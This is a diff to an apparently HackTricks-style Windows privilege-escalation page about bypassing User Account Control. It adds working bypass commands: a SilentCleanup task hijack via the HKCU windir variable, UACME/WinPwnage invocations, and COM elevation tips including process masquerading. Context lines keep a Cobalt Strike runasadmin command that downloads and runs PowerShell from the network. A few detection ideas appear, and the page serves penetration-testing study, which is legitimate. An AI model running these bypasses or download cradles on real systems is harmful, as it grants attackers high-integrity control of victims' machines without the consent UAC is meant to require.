@@ -13,7 +13,7 @@ For more info about integrity levels:
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.
+When UAC is in place, an administrator user is given 2 tokens: a standard user token, to perform regular actions at medium integrity, and one with the admin privileges.
 
 This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
 
@@ -40,7 +40,7 @@ As a standard user with no admin rights, you can make sure the "standard" accoun
 
 Even if the user is in the **Administrators** group, these changes force the user to **re-enter their account credentials** in order to perform administrative actions.
 
-**The only downside is that this approach needs UAC disabled to work, which is unlikely to be the case in production environments.**
+**In practice this is only useful once you already have an elevated token, a UAC bypass, or a misconfiguration that lets you change these keys; otherwise the registry write itself is blocked.**
 
 The registry keys and entries that you must change are the following (with their default values in parentheses):
 
@@ -93,6 +93,24 @@ The UAC bypass is needed in the following situation: **the UAC is activated, you
 
 It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**
 
+### Fast triage from a medium-integrity shell
+
+Before trying a bypass, confirm you are in the right scenario and map the host build to known working methods:
+
+```powershell
+whoami /groups
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
+powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
+schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+```
+
+Practical notes:
+- If `EnableLUA=0`, you do not need a bypass: any admin token can request high integrity directly.
+- `ConsentPromptBehaviorAdmin=2` or `5` is the common scenario for auto-elevate / COM-based bypasses.
+- `Always Notify` raises the bar, but you should still test the exact build instead of assuming failure: UACME still tracks some `AlwaysNotify compatible` methods on modern Windows builds.
+
 ### UAC disabled
 
 If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
@@ -125,7 +143,7 @@ dir \\127.0.0.1\c$\Users\Administrator\Desktop
 
 ### UAC bypass with cobalt strike
 
-The Cobalt Strike techniques will only work if UAC is not set at it's max security level
+The Cobalt Strike techniques will only work if UAC is not set at its max security level
 
 ```bash
 # UAC bypass via token duplication
@@ -140,6 +158,15 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ```
 
 **Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
+
+### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)
+
+Auto-elevated COM objects remain a practical UAC surface on modern builds. `ICMLuaUtil` is still tracked by UACME as working on current Windows branches, and offensive tooling keeps adapting `CMSTPLUA` by combining an interactive desktop process, 64-bit execution, and sometimes PEB/process masquerading before invoking the COM Elevation Moniker.
+
+Practical tips:
+- Prefer a **64-bit** process in the user's **interactive session** (commonly `explorer.exe` or a child of it).
+- If a raw shell fails, retry from a BOF / UACME implementation instead of a naive `CreateProcess` wrapper.
+- Expect child execution to occur in a **separate elevated process**; many BOFs do not elevate the current beacon in-place.
 
 ### KRBUACBypass
 
@@ -161,6 +188,16 @@ Major  Minor  Build  Revision
 ```
 
 Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
+
+A practical workflow is to first **score the host build**, and only then fire the matching method:
+
+```cmd
+python main.py --scan uac
+Akagi64.exe 33 C:\Windows\System32\cmd.exe
+```
+
+- `WinPwnage` quickly compares the local build against its known UAC methods, which is useful to discard dead PoCs fast.
+- `UACME` remains the best public catalogue to map a bypass to a precise build. Recent releases added new methods and re-tested existing ones against **Windows 11 25H2**, so re-check the README/release notes before assuming an old blog post still applies unchanged.
 
 ### UAC Bypass – fodhelper.exe (Registry hijack)
 
@@ -220,11 +257,23 @@ schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c 
 
 This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.
 
+### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)
+
+`SilentCleanup` launches `cleanmgr.exe` with highest privileges and expands `%windir%` from the user environment. If you control `HKCU\Environment\windir`, you can redirect that expansion to an arbitrary command and get high integrity without a consent dialog. This method is still worth testing on recent builds because UACME keeps the technique active and recent issue tracking shows Windows 11 24H2 may only require small quoting adjustments.
+
+```cmd
+reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
+schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+reg delete "HKCU\Environment" /v windir /f
+```
+
+If the task quotes the path on that build, retry with the payload ending in a quote (for example `cmd.exe"`). Always clean up `HKCU\Environment\windir` after testing.
+
 #### More UAC bypass
 
-**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
+Many classic UAC bypasses that abuse UI flows, COM objects, or desktop interaction require a **full interactive session** with the victim; a common `nc.exe` shell or a service running in **Session 0** is often not enough.
 
-You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
+You can often solve that using a **meterpreter** session. Migrate to a **process** that has the **Session** value equal to **1**:
 
 ![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)
 
@@ -232,7 +281,7 @@ You can get using a **meterpreter** session. Migrate to a **process** that has t
 
 ### UAC Bypass with GUI
 
-If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.
+If you have access to a **GUI you can just accept the UAC prompt** when it appears; you do not really need a technical bypass. Therefore, obtaining a GUI session is often enough to bypass the practical friction added by UAC.
 
 Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.
 
@@ -242,7 +291,7 @@ If you don't care about being noisy you could always **run something like** [**h
 
 ### Your own bypass - Basic UAC bypass methodology
 
-If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
+If you take a look at **UACME** you will notice that **many UAC bypasses abuse DLL hijacking** (often by making an elevated binary load an attacker-controlled DLL from a writable path). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
 1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
 2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
@@ -277,7 +326,21 @@ Detection ideas:
 - Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
 - Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.
 
+### Newer research worth checking separately
+
+Some post-2024 chains no longer look like the classic `HKCU\Software\Classes` registry hijacks. For example, activation-context cache poisoning can chain a **drive remap** and **DLL redirection** to move from medium to high integrity through trusted UI / auto-elevated binaries such as `ctfmon.exe` and later targets like `fodhelper.exe`. Instead of duplicating the large PoC here, check the compact payload examples in:
+
+{{#ref}}
+../windows-local-privilege-escalation/windows-c-payloads.md
+{{#endref}}
+
 ### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map
+
+For the full `RAiLaunchAdminProcess` / UIAccess attack surface on Windows 11 25H2, check the dedicated page:
+
+{{#ref}}
+../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
+{{#endref}}
 
 Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.
 
@@ -299,13 +362,14 @@ New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\
 ```
 
 ## References
-- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
-- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
 - [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
 - [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
 - [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
+- [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
 - [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
 - [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
-- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [Project Zero – Bypassing Administrator Protection by Abusing UI Access](https://projectzero.google/2026/02/windows-administrator-protection.html)
+- [Sigma / Detection.FYI – Bypass UAC Using SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
 
 {{#include ../../banners/hacktricks-training.md}}
